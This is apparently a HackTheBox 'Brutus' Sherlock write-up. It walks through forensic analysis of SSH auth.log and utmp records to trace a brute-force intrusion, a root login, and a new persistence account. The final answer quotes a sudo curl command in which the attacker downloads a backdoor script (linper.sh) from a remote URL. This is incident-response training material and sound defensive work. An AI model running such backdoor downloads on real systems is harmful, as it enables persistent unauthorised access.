# HackTheBox Sherlocks - Brutus

![Brutus Logo](image.png)

https://app.hackthebox.com/sherlocks/Brutus

## Analyzing the auth.log, can you identify the IP address used by the attacker to carry out a brute force attack?

First, what is a brute-force attack: 

A brute-force attack is a trial-and-error method used to obtain information such as a user password or personal identification number (PIN). In a brute-force attack, automated software is used to generate a large number of consecutive guesses as to the value of the desired data. This method is often used by attackers to crack passwords, encryption keys, or find hidden web pages.

So, we need to find a repetition of failed athentification and si wich ip is used to perform this attack

In auth.log 
```log
Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2332]: Failed password for invalid user admin from 65.2.161.68 port 46444 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2335]: Failed password for invalid user admin from 65.2.161.68 port 46460 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2337]: Failed password for invalid user admin from 65.2.161.68 port 46498 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2334]: Failed password for invalid user admin from 65.2.161.68 port 46454 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2338]: Failed password for backup from 65.2.161.68 port 46512 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2336]: Failed password for backup from 65.2.161.68 port 46468 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2330]: Failed password for invalid user admin from 65.2.161.68 port 46422 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2328]: Failed password for invalid user admin from 65.2.161.68 port 46390 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2329]: Failed password for invalid user admin from 65.2.161.68 port 46414 ssh2
Mar  6 06:31:33 ip-172-31-35-28 sshd[2333]: Failed password for invalid user admin from 65.2.161.68 port 46452 ssh2
```
As we can see, the `65.2.161.68` Ip have tried at multiple times to connect to the ssh server as admin and backup user.

> Answer : 65.2.161.68

## The brute force attempts were successful, and the attacker gained access to an account on the server. What is the username of this account?

At the line 281 we see for the first time "Accepted password". 
```log
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2

```
We understand that the attacker has found the root password.

> Answer : root

## Can you identify the timestamp when the attacker manually logged in to the server to carry out their objectives?

We know that the attacker ip is : `65.2.161.68`.
We know that the first account that the attacker own is : `root`

To see when the attacker has etablished a connection we use the `utmpdumputmpdum` tool.
```log
00505] [tty1] [        ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[6] [00505] [tty1] [LOGIN   ] [tty1        ] [                    ] [0.0.0.0        ] [2024-03-06T06:17:27,469940+00:00]
[1] [00053] [~~  ] [runlevel] [~           ] [6.2.0-1018-aws      ] [0.0.0.0        ] [2024-03-06T06:17:29,538024+00:00]
[7] [01583] [ts/0] [root    ] [pts/0       ] [203.101.190.9       ] [203.101.190.9  ] [2024-03-06T06:19:55,151913+00:00]
[7] [02549] [ts/1] [root    ] [pts/1       ] [65.2.161.68         ] [65.2.161.68    ] [2024-03-06T06:32:45,387923+00:00]
[8] [02491] [    ] [        ] [pts/1       ] [                    ] [0.0.0.0        ] [2024-03-06T06:37:24,590579+00:00]
```

We see that the first root connection with the attacker ip is at `2024-03-06T06:32:45`.

> Answer : 2024-03-06 06:32:45

## SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

Go back to auth.log file.
At the line 324 : 

```log
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```
The first session used by the attacker is the session 37.

> Answer : 37 

## The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

in auth.log :
```log
Mar  6 06:34:31 ip-172-31-35-28 chfn[2605]: changed user 'cyberjunkie' information
```
 
> Answer : cyberjunkie

## What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

[Mitre site](https://attack.mitre.org/techniques/T1136/)

> Answer: T1136.001 

## What time did the attacker's first SSH session end according to auth.log?

In the auth.log file (line 356), we see that that the first root session is closed at 06:37:24

```log
Mar  6 06:37:24 ip-172-31-35-28 sshd[2491]: Disconnected from user root 65.2.161.68 port 53184
```
> Answer : 2024-03-06 06:37:24

## The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

At the line 375, we see that the attacker using their new user to download a persistent backdoor called Linper :
```log 
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

```
> Answer : /usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
